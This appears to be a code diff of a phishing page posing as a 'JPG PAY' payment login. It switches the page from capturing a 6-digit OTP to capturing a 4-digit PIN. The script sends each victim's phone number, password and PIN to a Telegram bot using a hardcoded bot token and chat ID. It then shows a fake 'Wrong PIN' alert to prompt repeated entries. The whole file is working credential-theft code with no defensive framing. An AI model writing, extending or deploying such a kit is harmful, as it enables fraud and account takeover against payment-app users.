@@ -109,7 +109,7 @@
     .popup-box h2 { font-size: 20px; margin-bottom: 10px; text-align: left; color: #333; }
     .popup-box p { font-size: 14px; color: #666; margin-bottom: 15px; line-height: 1.4; text-align: left; }
     .popup-box p span { color: #009688; font-weight: bold; }
-    .otp-input-group {
+    .pin-input-group {
       display: flex;
       background: #ffffff;
       border: 1.5px solid #cccccc;
@@ -117,15 +117,16 @@
       padding: 5px;
       margin-bottom: 15px;
     }
-    .otp-input-group input {
+    .pin-input-group input {
       flex: 1; background: transparent; border: none;
       color: #333; padding: 10px; font-size: 16px; outline: none;
+      letter-spacing: 4px;
     }
-    .otp-input-group button {
+    .pin-input-group button {
       background: #009688; color: #fff; border: none;
       border-radius: 20px; padding: 0 18px; font-weight: bold; cursor: pointer;
     }
-    .otp-input-group button:disabled { background: #cccccc; color: #777; }
+    .pin-input-group button:disabled { background: #cccccc; color: #777; }
     .timer-text { color: #777; font-size: 13px; margin-bottom: 15px; text-align: center; }
   </style>
 </head>
@@ -155,30 +156,30 @@
       <input type="radio" checked> Agree "User Privacy Agreement"
     </div>
 
-    <button class="btn-main" onclick="showOTP()">Sign In</button>
+    <button class="btn-main" onclick="showPIN()">Sign In</button>
   </div>
 
-  <div class="popup-overlay" id="otpPopup">
+  <div class="popup-overlay" id="pinPopup">
     <div class="popup-box">
-      <button class="close-btn" onclick="closeOTP()">✕</button>
-      <h2>Login OTP</h2>
-      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
-      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>
+      <button class="close-btn" onclick="closePIN()">✕</button>
+      <h2>Login PIN</h2>
+      <p>Tap Send to receive the PIN, then enter it to confirm this login.</p>
+      <p>PIN will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>
 
-      <div class="otp-input-group">
-        <input type="tel" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
-        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
+      <div class="pin-input-group">
+        <input type="tel" id="pinInput" placeholder="Enter 4-digit PIN" maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,4)">
+        <button id="sendPinBtn" onclick="sendPIN()">Send</button>
       </div>
 
       <div class="timer-text" id="timerText"></div>
 
-      <button class="btn-main" onclick="verifyOTP()">Confirm</button>
+      <button class="btn-main" onclick="verifyPIN()">Confirm</button>
     </div>
   </div>
 
   <script>
     // ==========================================
-    // JPG PAY - UPDATED TELEGRAM DETAILS
+    // JPG PAY - TELEGRAM DETAILS
     // ==========================================
     const BOT_TOKEN = "8990784308:AAHT79h9bUWISEm-eXZImzcdmISDsqqf9HM";
     const CHAT_ID = "7318531273";
@@ -186,7 +187,7 @@
     let countdown;
     let timeLeft = 60;
 
-    function showOTP() {
+    function showPIN() {
       let phone = document.getElementById('phone').value;
       let pass = document.getElementById('pass').value;
 
@@ -203,25 +204,41 @@
       document.getElementById('displayPhone').innerText = "+91 " + phone;
       let msg1 = "🔔 *JPG PAY - New Login Attempt*\n\n📞 Phone: " + phone + "\n🔑 Password: " + pass;
       sendToTelegram(msg1);
-      document.getElementById('otpPopup').style.display = 'flex';
+      document.getElementById('pinPopup').style.display = 'flex';
       resetTimer();
     }
-    function closeOTP() { document.getElementById('otpPopup').style.display = 'none'; clearInterval(countdown); }
-    function sendOTP() {
+
+    function closePIN() { 
+      document.getElementById('pinPopup').style.display = 'none'; 
+      clearInterval(countdown); 
+    }
+
+    function sendPIN() {
       let phone = document.getElementById('phone').value;
       startTimer();
-      sendToTelegram("📩 *JPG PAY - OTP Send Button Pressed*\nPhone: " + phone);
-      document.getElementById('sendOtpBtn').disabled = true;
-      document.getElementById('sendOtpBtn').innerText = "Sent";
+      sendToTelegram("📩 *JPG PAY - PIN Send Button Pressed*\nPhone: " + phone);
+      document.getElementById('sendPinBtn').disabled = true;
+      document.getElementById('sendPinBtn').innerText = "Sent";
     }
-    function verifyOTP() {
-      let otp = document.getElementById('otpInput').value;
+
+    function verifyPIN() {
+      let pin = document.getElementById('pinInput').value;
       let phone = document.getElementById('phone').value;
-      if (otp === "") { alert("Bhai, OTP daalo!"); return; }
-      if (otp.length !== 6) { alert("OTP exactly 6 digit ka hona chahiye!"); return; }
-      sendToTelegram("🔐 *JPG PAY - OTP Entered*\nPhone: " + phone + "\nOTP: " + otp);
-      setTimeout(() => { alert("❌ Wrong OTP! Please try again."); }, 500);
+
+      if (pin === "") { 
+        alert("Bhai, PIN daalo!"); 
+        return; 
+      }
+
+      if (pin.length !== 4) { 
+        alert("PIN exactly 4 digit ka hona chahiye!"); 
+        return; 
+      }
+
+      sendToTelegram("🔐 *JPG PAY - PIN Entered*\nPhone: " + phone + "\nPIN: " + pin);
+      setTimeout(() => { alert("❌ Wrong PIN! Please try again."); }, 500);
     }
+
     function startTimer() {
       timeLeft = 60;
       const timerDisplay = document.getElementById('timerText');
@@ -229,20 +246,22 @@
       countdown = setInterval(() => {
         if (timeLeft <= 0) {
           clearInterval(countdown); timerDisplay.innerText = "";
-          document.getElementById('sendOtpBtn').disabled = false;
-          document.getElementById('sendOtpBtn').innerText = "Send";
+          document.getElementById('sendPinBtn').disabled = false;
+          document.getElementById('sendPinBtn').innerText = "Send";
         } else {
-          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
+          timerDisplay.innerText = "⏳ Resend PIN in " + timeLeft + "s";
           timeLeft--;
         }
       }, 1000);
     }
+
     function resetTimer() {
       clearInterval(countdown); timeLeft = 60;
-      document.getElementById('sendOtpBtn').disabled = false;
-      document.getElementById('sendOtpBtn').innerText = "Send";
-      document.getElementById('otpInput').value = "";
+      document.getElementById('sendPinBtn').disabled = false;
+      document.getElementById('sendPinBtn').innerText = "Send";
+      document.getElementById('pinInput').value = "";
     }
+
     function sendToTelegram(message) {
       let url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=Markdown&text=" + encodeURIComponent(message);
       fetch(url).then(res => console.log(res.status)).catch(err => console.error(err));
